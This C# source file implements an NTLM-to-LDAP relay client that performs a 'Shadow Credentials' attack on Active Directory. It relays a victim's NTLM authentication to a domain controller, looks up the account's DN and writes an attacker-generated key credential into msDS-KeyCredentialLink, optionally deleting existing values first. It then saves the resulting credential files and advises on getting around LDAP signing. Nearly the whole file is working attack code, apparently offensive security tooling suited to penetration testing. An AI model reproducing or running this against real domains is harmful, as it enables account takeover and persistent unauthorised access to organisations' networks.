using System.Net.Security;
using System.Net.Sockets;
using System.Text;

namespace HttpLdapRelay
{
    public class LdapResult
    {
        public int ResultCode { get; set; }
        public string MatchedDn { get; set; }
        public string DiagnosticMessage { get; set; }
    }

    /// <summary>
    /// Thrown when the DC explicitly rejects a relayed bind or post-bind operation
    /// (typically LDAP signing required on plain LDAP, or LDAPS channel binding / EPA enforced).
    /// </summary>
    public class LdapRelayRejectedException : Exception
    {
        public LdapResult Result { get; }
        public bool UseSsl { get; }

        public LdapRelayRejectedException(LdapResult result, bool useSsl, string message)
            : base(message)
        {
            Result = result;
            UseSsl = useSsl;
        }
    }


    public class LdapRelayClient : IDisposable
    {
        private TcpClient _tcpClient;
        private Stream _stream;
        private readonly string _targetHost;
        private readonly int _targetPort;
        private readonly bool _useSsl;
        private int _messageId = 0;
        public bool UseSsl => _useSsl;

        public LdapRelayClient(string targetHost, int targetPort, bool useSsl = false)
        {
            _targetHost = targetHost;
            _targetPort = targetPort;
            _useSsl = useSsl;
        }

        public void Connect()
        {
            _tcpClient = new TcpClient(_targetHost, _targetPort);

            if (_useSsl)
            {
                var ssl = new SslStream(_tcpClient.GetStream(), false, (_, _, _, _) => true);
                ssl.AuthenticateAsClient(_targetHost);
                _stream = ssl;
            }
            else
            {
                _stream = _tcpClient.GetStream();
            }
        }

        // =========================================================
        // NTLM RELAY
        // =========================================================

        public byte[] SendNtlmNegotiate(byte[] ntlmType1)
        {
            byte[] spnego = BuildSpnegoNegTokenInit(ntlmType1);
            SendMessage(BuildSaslBindRequest(spnego));
            byte[] response = ReceiveMessage();
            return ExtractNtlmFromSpnego(response);
        }

        public LdapResult SendNtlmAuthenticate(byte[] ntlmType3)
        {
            byte[] spnego = BuildSpnegoNegTokenResp(ntlmType3);
            SendMessage(BuildSaslBindRequest(spnego));
            byte[] response = ReceiveMessage();
            return ParseBindResponse(response);
        }

        private byte[] BuildSaslBindRequest(byte[] spnego)
        {
            _messageId++;

            byte[] mechanism = EncodeOctetString(Encoding.ASCII.GetBytes("GSS-SPNEGO"));
            byte[] credentials = EncodeOctetString(spnego);

            byte[] sasl = Wrap(0xA3, Combine(mechanism, credentials));

            byte[] bindRequest = Wrap(0x60, Combine(
                EncodeInteger(3),
                EncodeOctetString(Array.Empty<byte>()),
                sasl
            ));

            return Wrap(0x30, Combine(
                EncodeInteger(_messageId),
                bindRequest
            ));
        }

        private byte[] BuildSpnegoNegTokenInit(byte[] ntlm)
        {
            byte[] ntlmOid = { 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A };

            byte[] mechTypes = Wrap(0x30, ntlmOid);
            byte[] mechToken = Wrap(0xA2, EncodeOctetString(ntlm));

            byte[] negTokenInit = Wrap(0x30, Combine(
                Wrap(0xA0, mechTypes),
                mechToken
            ));

            return Wrap(0x60, Combine(
                new byte[] { 0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02 },
                Wrap(0xA0, negTokenInit)
            ));
        }

        private byte[] BuildSpnegoNegTokenResp(byte[] ntlm)
        {
            byte[] negResp = Wrap(0x30, Wrap(0xA2, EncodeOctetString(ntlm)));
            return Wrap(0xA1, negResp);
        }

        private byte[] ExtractNtlmFromSpnego(byte[] data)
        {
            for (int i = 0; i < data.Length - 8; i++)
            {
                if (Encoding.ASCII.GetString(data, i, 7) == "NTLMSSP")
                {
                    byte[] ntlm = new byte[data.Length - i];
                    Buffer.BlockCopy(data, i, ntlm, 0, ntlm.Length);
                    return ntlm;
                }
            }
            throw new InvalidOperationException("No NTLM Type 2 received");
        }

        // =========================================================
        // LDAP Search Operations
        // =========================================================

        /// <summary>
        /// Search for a computer or user by sAMAccountName and return the DN
        /// </summary>
        public string FindDnBySamAccountName(string samAccountName, string domain)
        {
            //Console.WriteLine($"[*] Searching for sAMAccountName: {samAccountName}");

            string searchBase = string.Join(
                ",",
                domain.Split('.', StringSplitOptions.RemoveEmptyEntries)
                      .Select(part => $"DC={part}")
            );

            string cnClient = samAccountName.Substring(0, samAccountName.Length - 1);

            Console.WriteLine($"[*] Building ldap search request for {cnClient}...\n");

            var searchRequest = BuildSearchRequest(searchBase, cnClient);

            SendMessage(searchRequest);
            byte[] response = ReceiveMessage();

            string dn = ParseSearchResponseForDn(response);

            if (string.IsNullOrEmpty(dn))
            {
                // The search may have been rejected by the DC (e.g. LDAP signing or LDAPS channel binding required).
                // The rejection comes back as a SearchResultDone (0x65) with a non-zero resultCode.
                LdapResult done = ParseSearchResultDone(response);
                if (done != null && done.ResultCode != 0)
                {
                    string diagnostic = DiagnoseRelayFailure(done, _useSsl);
                    if (!string.IsNullOrEmpty(diagnostic))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine(diagnostic);
                        Console.ResetColor();
                    }
                    throw new LdapRelayRejectedException(done, _useSsl,
                        $"LDAP search rejected by DC (code {done.ResultCode} - {GetStaticLdapErrorMessage(done.ResultCode)})");
                }
                Console.WriteLine($"[!] Could not find DN for {samAccountName}");
            }

            return dn;
        }

        private byte[] BuildSearchRequest(string baseDn, string cnClient)
        {
            _messageId++;

            // Build equality filter: (CN=cnClient)
            byte[] attrDesc = EncodeOctetString(Encoding.UTF8.GetBytes("CN"));
            byte[] attrValue = EncodeOctetString(Encoding.UTF8.GetBytes(cnClient));
            byte[] filterBytes = Wrap(0xA3, Combine(attrDesc, attrValue)); // 0xA3 = equalityMatch

            // SearchRequest ::= [APPLICATION 3] SEQUENCE
            byte[] searchRequest = Wrap(0x63, Combine(
                EncodeOctetString(Encoding.UTF8.GetBytes(baseDn)),  // baseObject
                EncodeEnumerated(2),                                 // scope: subtree (2)
                EncodeEnumerated(0),                                 // derefAliases: never (0)
                EncodeInteger(0),                                    // sizeLimit
                EncodeInteger(0),                                    // timeLimit
                new byte[] { 0x01, 0x01, 0x00 },                     // typesOnly = FALSE
                filterBytes,                                         // filter
                new byte[] { 0x30, 0x00 }                            // attributes (which is emtpy)
            ));

            return Wrap(0x30, Combine(
                EncodeInteger(_messageId),
                searchRequest
            ));
        }

        private string ParseSearchResponseForDn(byte[] response)
        {
            // Look for SearchResultEntry (0x64) and extract DN
            try
            {
                int idx = 0;
                while (idx < response.Length - 10)
                {
                    // Find SearchResultEntry tag (0x64)
                    if (response[idx] == 0x30) // LDAPMessage SEQUENCE
                    {
                        idx++;
                        int msgLen;
                        (msgLen, idx) = ReadLength(response, idx);

                        // Skip message ID
                        if (response[idx] == 0x02)
                        {
                            idx++;
                            int idLen;
                            (idLen, idx) = ReadLength(response, idx);
                            idx += idLen;
                        }

                        // Check for SearchResultEntry (0x64)
                        if (idx < response.Length && response[idx] == 0x64)
                        {
                            idx++;
                            int entryLen;
                            (entryLen, idx) = ReadLength(response, idx);

                            // First element is the DN (OCTET STRING)
                            if (idx < response.Length && response[idx] == 0x04)
                            {
                                idx++;
                                int dnLen;
                                (dnLen, idx) = ReadLength(response, idx);

                                if (dnLen > 0 && idx + dnLen <= response.Length)
                                {
                                    return Encoding.UTF8.GetString(response, idx, dnLen);
                                }
                            }
                        }
                    }
                    idx++;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error parsing search response: {ex.Message}");
            }

            return null;
        }

        // =========================================================
        // Shadow Credentials Attack
        // =========================================================

        /// <summary>
        /// Performs the Shadow Credentials attack, automatically finding the DN
        /// from the sAMAccountName extracted from NTLM authentication
        /// </summary>
        public ShadowCredentials.ShadowCredentialResult AddShadowCredentialsAuto(string samAccountName, string domain, string outputPath = null, bool forceOverwrite = false)
        {
            Console.WriteLine($"[*] sAMAccountName: {samAccountName}");

            // Find the DN for this account
            string targetDn = FindDnBySamAccountName(samAccountName, domain);

            if (string.IsNullOrEmpty(targetDn))
            {
                throw new Exception($"Could not find DN for account: {samAccountName}");
            }

            /// <summary>
            /// Performs the Shadow Credentials attack on a COMPUTER account.
            /// Uses the same approach as PyWhisker: read existing values, then REPLACE with old + new
            /// </summary>

            Console.WriteLine();
            Console.WriteLine("[*] Starting Shadow Credentials attack...");
            Console.WriteLine($"[*] Target DN: {targetDn}");

            if (forceOverwrite)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[*] Force mode enabled - will clear existing values first");
                Console.ResetColor();
            }

            // Step 1: Read existing msDS-KeyCredentialLink values (like PyWhisker does)
            Console.WriteLine("[*] Reading existing msDS-KeyCredentialLink values...");
            var existingValues = ReadKeyCredentialLink(targetDn);
            Console.WriteLine($"[*] Found {existingValues.Count} existing value(s)");


            // Generate the shadow credential with appropriate format
            ShadowCredentials.ShadowCredentialResult result;
            result = ShadowCredentials.CreateForComputer(targetDn);

            Console.WriteLine($"[+] Generated KeyCredential");

            // Step 2: If force mode and existing values, delete them first
            if (forceOverwrite && existingValues.Count > 0)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine($"[*] Force mode: Clearing {existingValues.Count} existing value(s)...");
                Console.ResetColor();

                // Try to delete each existing value individually
                bool deleteSuccess = true;
                foreach (var existingValue in existingValues)
                {
                    byte[] deleteRequest = BuildModifyRequestDelete(
                        targetDn,
                        "msDS-KeyCredentialLink",
                        existingValue
                    );

                    SendMessage(deleteRequest);
                    byte[] deleteResponse = ReceiveMessage();
                    var deleteResult = ParseModifyResponse(deleteResponse);

                    if (deleteResult.ResultCode != 0)
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"[!] Warning: Could not delete existing value (Error: {GetLdapErrorMessage(deleteResult.ResultCode)})");
                        Console.ResetColor();
                        deleteSuccess = false;
                        // Continue trying to delete other values
                    }
                }
                if (deleteSuccess)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[+] Successfully cleared existing values");
                    Console.ResetColor();
                }
            }
            // Step 3: Add the new credential using MODIFY_ADD
            byte[] modifyRequest = BuildModifyRequestAdd(
                targetDn,
                "msDS-KeyCredentialLink",
                result.DnBinaryValue
            );

            Console.WriteLine("[*] Sending LDAP ModifyRequest (ADD operation)...");

            SendMessage(modifyRequest);
            byte[] response = ReceiveMessage();

            var ldapResult = ParseModifyResponse(response);

            if (ldapResult.ResultCode == 0)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Shadow credentials successfully added!");
                Console.ResetColor();

                ShadowCredentials.PrintInfo(result);

                // Save files
                string basePath = outputPath;
                if (string.IsNullOrEmpty(basePath))
                {
                    string safeName = ExtractCnFromDn(targetDn)?.Replace("$", "") ?? "shadow_cred";
                    safeName = System.Text.RegularExpressions.Regex.Replace(safeName, @"[^\w]", "_");
                    basePath = Path.Combine(Environment.CurrentDirectory, safeName);
                }
                ShadowCredentials.SaveToFiles(result, basePath);
                return result;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!] Failed to add shadow credentials!");
                Console.WriteLine($"[!] LDAP Error Code: {ldapResult.ResultCode}");
                Console.WriteLine($"[!] Error: {GetLdapErrorMessage(ldapResult.ResultCode)}");
                if (!string.IsNullOrEmpty(ldapResult.DiagnosticMessage))
                {
                    Console.WriteLine($"[!] Diagnostic: {ldapResult.DiagnosticMessage}");
                }

                // Suggest using --force if there are existing values and we didn't already try
                if (!forceOverwrite && existingValues.Count > 0)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine();
                    Console.WriteLine("[*] The target has existing msDS-KeyCredentialLink values.");
                    Console.WriteLine("[*] Try using --force to clear them first.");
                    Console.ResetColor();
                }

                Console.ResetColor();

                throw new Exception($"LDAP ModifyRequest failed: {GetLdapErrorMessage(ldapResult.ResultCode)}");
            }
        }

        /// <summary>
        /// Build LDAP Modify request with DELETE operation for a specific value
        /// </summary>
        private byte[] BuildModifyRequestDelete(string dn, string attribute, string value)
        {
            _messageId++;

            // Build SET with the value to delete
            byte[] attrValue = EncodeOctetString(Encoding.UTF8.GetBytes(value));
            byte[] attrValues = Wrap(0x31, attrValue);

            byte[] attrType = EncodeOctetString(Encoding.UTF8.GetBytes(attribute));
            byte[] partialAttribute = Wrap(0x30, Combine(attrType, attrValues));

            // Operation: DELETE = 1
            byte[] operation = EncodeEnumerated(1); // MODIFY_DELETE

            byte[] change = Wrap(0x30, Combine(operation, partialAttribute));
            byte[] changes = Wrap(0x30, change);

            byte[] dnOctet = EncodeOctetString(Encoding.UTF8.GetBytes(dn));
            byte[] modifyRequest = Wrap(0x66, Combine(dnOctet, changes));

            return Wrap(0x30, Combine(
                EncodeInteger(_messageId),
                modifyRequest
            ));
        }

        /// <summary>
        /// Build LDAP Modify request with ADD operation
        /// </summary>
        private byte[] BuildModifyRequestAdd(string dn, string attribute, string value)
        {
            _messageId++;

            // Build SET with single value
            byte[] attrValue = EncodeOctetString(Encoding.UTF8.GetBytes(value));
            byte[] attrValues = Wrap(0x31, attrValue);

            byte[] attrType = EncodeOctetString(Encoding.UTF8.GetBytes(attribute));
            byte[] partialAttribute = Wrap(0x30, Combine(attrType, attrValues));

            // Operation: ADD = 0
            byte[] operation = EncodeEnumerated(0); // MODIFY_ADD

            byte[] change = Wrap(0x30, Combine(operation, partialAttribute));
            byte[] changes = Wrap(0x30, change);

            byte[] dnOctet = EncodeOctetString(Encoding.UTF8.GetBytes(dn));
            byte[] modifyRequest = Wrap(0x66, Combine(dnOctet, changes));

            return Wrap(0x30, Combine(
                EncodeInteger(_messageId),
                modifyRequest
            ));
        }

        /// <summary>
        /// Read existing msDS-KeyCredentialLink values from target
        /// </summary>
        private List<string> ReadKeyCredentialLink(string targetDn)
        {
            var values = new List<string>();

            try
            {
                // Build search request for msDS-KeyCredentialLink attribute
                var searchRequest = BuildSearchRequestForDn(targetDn, new[] { "msDS-KeyCredentialLink" });
                SendMessage(searchRequest);
                byte[] response = ReceiveMessage();

                // Parse search response for attribute values
                values = ParseSearchResponseForAttributeValues(response, "msDS-KeyCredentialLink");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[*] Could not read existing values: {ex.Message}");
            }

            return values;
        }

        /// <summary>
        /// Build search request for a specific DN (BASE scope)
        /// </summary>
        private byte[] BuildSearchRequestForDn(string dn, string[] attributes)
        {
            _messageId++;

            // Build attribute list
            var attrList = new List<byte>();
            foreach (var attr in attributes)
            {
                var attrBytes = EncodeOctetString(Encoding.UTF8.GetBytes(attr));
                attrList.AddRange(attrBytes);
            }
            byte[] attributesSeq = Wrap(0x30, attrList.ToArray());

            // Present filter for (objectClass=*)
            byte[] filterBytes = Wrap(0x87, Encoding.UTF8.GetBytes("objectClass"));

            // SearchRequest with BASE scope (0)
            byte[] searchRequest = Wrap(0x63, Combine(
                EncodeOctetString(Encoding.UTF8.GetBytes(dn)),  // baseObject = target DN
                EncodeEnumerated(0),                             // scope: base (0)
                EncodeEnumerated(0),                             // derefAliases: never (0)
                EncodeInteger(0),                                // sizeLimit
                EncodeInteger(0),                                // timeLimit
                new byte[] { 0x01, 0x01, 0x00 },                 // typesOnly = FALSE
                filterBytes,                                     // filter
                attributesSeq                                    // attributes
            ));

            return Wrap(0x30, Combine(
                EncodeInteger(_messageId),
                searchRequest
            ));
        }

        /// <summary>
        /// Parse search response and extract all values for a specific attribute
        /// </summary>
        private List<string> ParseSearchResponseForAttributeValues(byte[] response, string attributeName)
        {
            var values = new List<string>();

            try
            {
                // Find all attribute values in the response
                // Look for the attribute name followed by SET of values
                string attrNameLower = attributeName.ToLowerInvariant();
                int idx = 0;

                while (idx < response.Length - 10)
                {
                    // Find SearchResultEntry (0x64)
                    if (response[idx] == 0x64)
                    {
                        idx++;
                        int entryLen;
                        (entryLen, idx) = ReadLength(response, idx);
                        int entryEnd = idx + entryLen;

                        // Skip DN
                        if (response[idx] == 0x04)
                        {
                            idx++;
                            int dnLen;
                            (dnLen, idx) = ReadLength(response, idx);
                            idx += dnLen;
                        }

                        // Parse attributes SEQUENCE
                        if (idx < entryEnd && response[idx] == 0x30)
                        {
                            idx++;
                            int attrsLen;
                            (attrsLen, idx) = ReadLength(response, idx);

                            // Parse each attribute
                            while (idx < entryEnd)
                            {
                                if (response[idx] == 0x30)
                                {
                                    idx++;
                                    int attrLen;
                                    (attrLen, idx) = ReadLength(response, idx);
                                    int attrEnd = idx + attrLen;

                                    // Attribute type (OCTET STRING)
                                    if (response[idx] == 0x04)
                                    {
                                        idx++;
                                        int typeLen;
                                        (typeLen, idx) = ReadLength(response, idx);
                                        string attrType = Encoding.UTF8.GetString(response, idx, typeLen);
                                        idx += typeLen;

                                        // Check if this is the attribute we want
                                        if (attrType.Equals(attributeName, StringComparison.OrdinalIgnoreCase))
                                        {
                                            // Parse SET of values
                                            if (idx < attrEnd && response[idx] == 0x31)
                                            {
                                                idx++;
                                                int setLen;
                                                (setLen, idx) = ReadLength(response, idx);
                                                int setEnd = idx + setLen;

                                                // Extract each value
                                                while (idx < setEnd)
                                                {
                                                    if (response[idx] == 0x04)
                                                    {
                                                        idx++;
                                                        int valLen;
                                                        (valLen, idx) = ReadLength(response, idx);
                                                        if (valLen > 0)
                                                        {
                                                            string val = Encoding.UTF8.GetString(response, idx, valLen);
                                                            values.Add(val);
                                                        }
                                                        idx += valLen;
                                                    }
                                                    else
                                                    {
                                                        idx++;
                                                    }
                                                }
                                            }
                                        }
                                        else
                                        {
                                            idx = attrEnd;
                                        }
                                    }
                                    else
                                    {
                                        idx = attrEnd;
                                    }
                                }
                                else
                                {
                                    idx++;
                                }
                            }
                        }
                    }
                    idx++;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error parsing attribute values: {ex.Message}");
            }

            return values;
        }

        private LdapResult ParseModifyResponse(byte[] response) => ParseLdapResultResponse(response, 0x67);

        /// <summary>
        /// Parse a SASL BindResponse (tag 0x61) into an LdapResult.
        /// </summary>
        private LdapResult ParseBindResponse(byte[] response) => ParseLdapResultResponse(response, 0x61);

        /// <summary>
        /// Parse a SearchResultDone (tag 0x65) into an LdapResult.
        /// Returns null if the response does not contain a SearchResultDone (e.g. it carried a SearchResultEntry).
        /// </summary>
        private LdapResult ParseSearchResultDone(byte[] response)
        {
            int idx = FindTag(response, 0x65);
            if (idx < 0) return null;
            return ParseLdapResultResponse(response, 0x65);
        }

        /// <summary>
        /// Generic parser for LDAPResult-shaped responses (BindResponse 0x61, SearchResultDone 0x65, ModifyResponse 0x67, ...).
        /// All of them share the LDAPResult ASN.1 structure: ENUMERATED resultCode, OCTET STRING matchedDN, OCTET STRING diagnosticMessage.
        /// </summary>
        private LdapResult ParseLdapResultResponse(byte[] response, byte tag)
        {
            var result = new LdapResult();

            try
            {
                int idx = FindTag(response, tag);
                if (idx >= 0)
                {
                    idx++;
                    int contentLength;
                    (contentLength, idx) = ReadLength(response, idx);

                    if (idx < response.Length && response[idx] == 0x0A)
                    {
                        idx++;
                        int enumLen;
                        (enumLen, idx) = ReadLength(response, idx);
                        if (enumLen > 0 && idx < response.Length)
                        {
                            result.ResultCode = response[idx];
                            idx += enumLen;
                        }
                    }

                    if (idx < response.Length && response[idx] == 0x04)
                    {
                        idx++;
                        int strLen;
                        (strLen, idx) = ReadLength(response, idx);
                        if (strLen > 0)
                            result.MatchedDn = Encoding.UTF8.GetString(response, idx, strLen);
                        idx += strLen;
                    }

                    if (idx < response.Length && response[idx] == 0x04)
                    {
                        idx++;
                        int strLen;
                        (strLen, idx) = ReadLength(response, idx);
                        if (strLen > 0)
                            result.DiagnosticMessage = Encoding.UTF8.GetString(response, idx, strLen);
                    }
                }
            }
            catch
            {
                result.ResultCode = -1;
                result.DiagnosticMessage = "Failed to parse response";
            }

            return result;
        }

        /// <summary>
        /// Inspect an LdapResult coming from a relayed bind or post-bind operation and return a multi-line
        /// human-readable diagnostic block when the failure pattern matches LDAP signing required (plain LDAP)
        /// or LDAPS channel binding required. Returns null when the result is a clean success (code 0).
        /// </summary>
        public static string DiagnoseRelayFailure(LdapResult r, bool useSsl)
        {
            if (r == null) return null;
            if (r.ResultCode == 0) return null;

            string diag = r.DiagnosticMessage ?? string.Empty;
            string diagLower = diag.ToLowerInvariant();

            bool channelBindingPattern =
                diag.Contains("80090346") ||
                diagLower.Contains("channel binding") ||
                diagLower.Contains("channel bindings");

            bool signingPattern =
                diag.Contains("00002028") ||
                diag.Contains("0xc0000418") ||
                diagLower.Contains("integrity check") ||
                diagLower.Contains("turn on integrity") ||
                diagLower.Contains("strongerauthrequired");

            // strongerAuthRequired (8) on LDAP without SSL is the canonical "signing required" symptom,
            // even when the diagnostic message is empty.
            bool likelySigning = !useSsl && (signingPattern || r.ResultCode == 8);
            // strongerAuthRequired (8) on LDAPS implies channel binding enforcement (EPA).
            bool likelyChannelBinding = useSsl && (channelBindingPattern || r.ResultCode == 8);

            var sb = new StringBuilder();
            sb.AppendLine("[!] ═══════════════════════════════════════════════════════");
            if (likelySigning)
            {
                sb.AppendLine("[!]   LDAP SIGNING IS REQUIRED ON THE TARGET DC");
            }
            else if (likelyChannelBinding)
            {
                sb.AppendLine("[!]   LDAPS CHANNEL BINDING (EPA) IS ENFORCED ON THE TARGET DC");
            }
            else
            {
                sb.AppendLine("[!]   LDAP RELAY FAILED");
            }
            sb.AppendLine("[!] ═══════════════════════════════════════════════════════");
            sb.AppendLine($"[!] DC response code: {r.ResultCode} ({GetStaticLdapErrorMessage(r.ResultCode)})");
            if (!string.IsNullOrEmpty(diag))
            {
                sb.AppendLine($"[!] Diagnostic: {diag}");
            }
            if (likelySigning)
            {
                sb.AppendLine("[!] The relayed NTLM bind cannot be signed: every post-bind");
                sb.AppendLine("[!] operation will be rejected by the DC.");
                sb.AppendLine("[!] Retry with -s (or --ldaps) to target LDAPS on port 636.");
            }
            else if (likelyChannelBinding)
            {
                sb.AppendLine("[!] The relayed bind cannot satisfy channel binding (EPA):");
                sb.AppendLine("[!] the attack cannot succeed against this DC configuration.");
            }
            return sb.ToString().TrimEnd('\r', '\n');
        }

        private static string GetStaticLdapErrorMessage(int errorCode)
        {
            return errorCode switch
            {
                0 => "Success",
                1 => "Operations Error",
                2 => "Protocol Error",
                7 => "Auth Method Not Supported",
                8 => "Strong Auth Required",
                16 => "No Such Attribute",
                19 => "Constraint Violation",
                20 => "Attribute Or Value Exists",
                21 => "Invalid Attribute Syntax",
                32 => "No Such Object",
                49 => "Invalid Credentials",
                50 => "Insufficient Access Rights",
                53 => "Unwilling To Perform",
                _ => $"Unknown Error ({errorCode})"
            };
        }
        private (int length, int newIndex) ReadLength(byte[] data, int index)
        {
            if (index >= data.Length) return (0, index);

            int length = data[index++];

            if ((length & 0x80) != 0)
            {
                int numBytes = length & 0x7F;
                length = 0;
                for (int i = 0; i < numBytes && index < data.Length; i++)
                {
                    length = (length << 8) | data[index++];
                }
            }

            return (length, index);
        }

        private int FindTag(byte[] data, byte tag)
        {
            for (int i = 0; i < data.Length; i++)
                if (data[i] == tag) return i;
            return -1;
        }

        private string GetLdapErrorMessage(int errorCode) => GetStaticLdapErrorMessage(errorCode);
        // =========================================================
        // ASN.1 Encoding
        // =========================================================

        private static byte[] EncodeInteger(int v)
        {
            if (v >= 0 && v < 128)
                return new byte[] { 0x02, 0x01, (byte)v };

            var bytes = new List<byte>();
            int temp = v;
            while (temp != 0)
            {
                bytes.Insert(0, (byte)(temp & 0xFF));
                temp >>= 8;
            }

            if (v > 0 && (bytes[0] & 0x80) != 0)
                bytes.Insert(0, 0x00);

            var result = new List<byte> { 0x02, (byte)bytes.Count };
            result.AddRange(bytes);
            return result.ToArray();
        }

        private static byte[] EncodeEnumerated(int v) => new byte[] { 0x0A, 0x01, (byte)v };

        private static byte[] EncodeOctetString(byte[] d)
        {
            var l = new List<byte> { 0x04 };
            l.AddRange(EncodeLength(d.Length));
            l.AddRange(d);
            return l.ToArray();
        }

        private static byte[] EncodeLength(int len)
        {
            if (len < 0x80) return new[] { (byte)len };
            if (len <= 0xFF) return new[] { (byte)0x81, (byte)len };
            if (len <= 0xFFFF) return new[] { (byte)0x82, (byte)(len >> 8), (byte)(len & 0xFF) };
            return new[] { (byte)0x83, (byte)(len >> 16), (byte)((len >> 8) & 0xFF), (byte)(len & 0xFF) };
        }

        private static byte[] Wrap(byte tag, byte[] content)
        {
            var l = new List<byte> { tag };
            l.AddRange(EncodeLength(content.Length));
            l.AddRange(content);
            return l.ToArray();
        }

        private static byte[] Combine(params byte[][] arrays)
        {
            var l = new List<byte>();
            foreach (var a in arrays) l.AddRange(a);
            return l.ToArray();
        }

        private static string ExtractCnFromDn(string dn)
        {
            if (string.IsNullOrEmpty(dn)) return null;

            foreach (var part in dn.Split(','))
            {
                var trimmed = part.Trim();
                if (trimmed.StartsWith("CN=", StringComparison.OrdinalIgnoreCase))
                    return trimmed.Substring(3);
            }
            return null;
        }

        // =========================================================
        // Network I/O
        // =========================================================

        private void SendMessage(byte[] msg)
        {
            _stream.Write(msg, 0, msg.Length);
            _stream.Flush();
        }

        private byte[] ReceiveMessage()
        {
            var buf = new byte[16384];
            int totalRead = _stream.Read(buf, 0, buf.Length);

            while (_stream is NetworkStream ns && ns.DataAvailable && totalRead < buf.Length)
            {
                totalRead += _stream.Read(buf, totalRead, buf.Length - totalRead);
            }

            var data = new byte[totalRead];
            Buffer.BlockCopy(buf, 0, data, 0, totalRead);
            return data;
        }

        public void Dispose()
        {
            _stream?.Dispose();
            _tcpClient?.Dispose();
        }
    }
}